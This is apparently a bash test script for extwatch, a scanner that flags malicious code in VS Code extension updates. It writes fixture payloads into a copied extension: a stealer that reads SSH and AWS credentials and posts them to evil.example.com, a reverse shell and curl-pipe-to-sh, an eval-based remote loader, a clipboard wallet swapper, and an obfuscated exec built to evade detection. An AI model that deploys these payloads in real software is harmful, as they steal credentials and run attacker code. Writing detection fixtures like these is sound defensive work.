#!/usr/bin/env bash
#
# simulate.sh — exercise extwatch against realistic "malicious update" scenarios
# without touching your real ~/.vscode/extensions.
#
# Threat model: a trusted, already-installed extension ships an UPDATE that
# smuggles in malicious code. extwatch diffs the new version against the clean
# previous version on the marketplace, so the injected code surfaces as
# "introduced". This script reproduces that by cloning a REAL installed
# extension into a throwaway watch dir (the marketplace baseline lookup then
# succeeds) and injecting an attacker payload.
#
# The payloads are inert detection FIXTURES: they point at example.com (a
# reserved, non-routable domain) and are dropped into a temp dir that VS Code
# never loads — nothing is executed and nothing is exfiltrated. They exist only
# to test whether the scanner fires.
#
# Usage:
#   ./simulate.sh                                  # auto-pick an installed extension, default profile
#   ./simulate.sh vscodevim.vim-1.32.4             # target a specific installed dir
#   PAYLOAD=exfil      ./simulate.sh <name>        # credential exfiltration (HIGH)
#   PAYLOAD=shell      ./simulate.sh <name>        # reverse shell / command exec (HIGH)
#   PAYLOAD=loader     ./simulate.sh <name>        # staged remote-code loader (HIGH)
#   PAYLOAD=wallet     ./simulate.sh <name>        # clipboard stealer (LOW — report, no popup)
#   PAYLOAD=minified   ./simulate.sh <name>        # same attack, minified one-liner
#   PAYLOAD=obfuscated ./simulate.sh <name>        # EVASION — should slip past (false negative)
#   PAYLOAD=clean      ./simulate.sh <name>        # no injection — should be SILENT
#
set -euo pipefail

EXT_SRC_ROOT="${HOME}/.vscode/extensions"
PAYLOAD="${PAYLOAD:-exfil}"

# 1. Pick which installed extension to clone as the "victim".
if [[ $# -ge 1 ]]; then
  EXT_DIR_NAME="$1"
else
  EXT_DIR_NAME="$(ls -1 "$EXT_SRC_ROOT" | grep -E '^[^.]+\.[^/]+-[0-9]+\.[0-9]+\.[0-9]+' | grep -v '\.vsctmp$' | head -1)"
fi
SRC="${EXT_SRC_ROOT}/${EXT_DIR_NAME}"
[[ -d "$SRC" ]] || { echo "no such installed extension: $SRC" >&2; exit 1; }
echo "victim extension: $EXT_DIR_NAME"
echo "attacker profile: $PAYLOAD"

# 2. Build and start the watcher on a fresh temp dir.
go build -o /tmp/extwatch ./cmd/extwatch
WATCH="$(mktemp -d)"
trap 'kill "${PID:-0}" 2>/dev/null || true; rm -rf "$WATCH"' EXIT
echo "watch dir:        $WATCH"
echo "----------------------------------------------------------------------"
/tmp/extwatch --dir "$WATCH" &
PID=$!
sleep 1

# 3. "Install the update": copy the real extension in, then inject the payload.
cp -R "$SRC" "$WATCH/"
TARGET="$WATCH/$EXT_DIR_NAME"

case "$PAYLOAD" in
  exfil)
    # Credential theft: read SSH/AWS secrets + env, beacon them out.
    cat > "$TARGET/telemetry.js" <<'EOF'
const fs = require('fs');
const home = process.env.HOME;
const secrets = {
  ssh: fs.readFileSync(home + '/.ssh/id_rsa', 'utf8'),
  aws: fs.readFileSync(home + '/.aws/credentials', 'utf8'),
  env: process.env,
};
fetch('https://collect.evil.example.com/ingest', { method: 'POST', body: JSON.stringify(secrets) });
EOF
    ;;
  shell)
    # Reverse shell: spawn a long-lived process wired to a remote host.
    cat > "$TARGET/helper.js" <<'EOF'
const cp = require('child_process');
const sh = cp.spawn('/bin/sh', ['-i']);
cp.exec('curl -fsSL https://c2.evil.example.com/stage1 | sh');
EOF
    ;;
  loader)
    # Staged loader: pull remote code and execute it dynamically.
    cat > "$TARGET/runtime.js" <<'EOF'
const ws = new WebSocket('wss://c2.evil.example.com/agent');
fetch('https://cdn.evil.example.com/payload.txt')
  .then(r => r.text())
  .then(src => { const run = new Function(src); run(); eval(src); });
EOF
    ;;
  wallet)
    # Clipboard stealer (LOW): swap copied crypto addresses. Demonstrates the
    # terminal-report-only path (no desktop notification for LOW-only findings).
    cat > "$TARGET/clip.js" <<'EOF'
const { clipboard } = require('vscode').env;
setInterval(async () => {
  const text = await clipboard.readText();
  if (/^0x[a-fA-F0-9]{40}$/.test(text)) await clipboard.writeText('0xATTACKERWALLET');
}, 1000);
EOF
    ;;
  minified)
    # The 'loader' attack as a single dense line — how a real update ships.
    printf '%s\n' 'const _w=new WebSocket("wss://c2.evil.example.com/a");fetch("https://cdn.evil.example.com/p.txt").then(r=>r.text()).then(s=>{new Function(s)();eval(s)});const _c=require("child_process");_c.execSync("id");' \
      > "$TARGET/bundle.min.js"
    ;;
  obfuscated)
    # EVASION: builds the dangerous identifiers at runtime so none of the
    # literal patterns ("child_process", "exec(", "eval(") ever appear in the
    # source. extwatch is a substring/regexp scanner, not an AST parser, so this
    # is expected to slip past — the honest false-negative boundary (see README).
    cat > "$TARGET/loader.js" <<'EOF'
const mod = ["child", "process"].join("_");
const req = globalThis[Buffer.from("cmVxdWlyZQ==", "base64").toString()]; // "require"
const fn  = ["e", "x", "e", "c"].join("");
req(mod)[fn]("id");
EOF
    ;;
  clean)
    echo "(no payload injected — expect a SILENT result)"
    ;;
  *)
    echo "unknown PAYLOAD: $PAYLOAD" >&2; exit 1;;
esac

# 4. Wait out the 2s debounce + marketplace query + .vsix download + analysis.
echo "waiting for fetch + analyze..."
sleep 18
echo "----------------------------------------------------------------------"
echo "done."
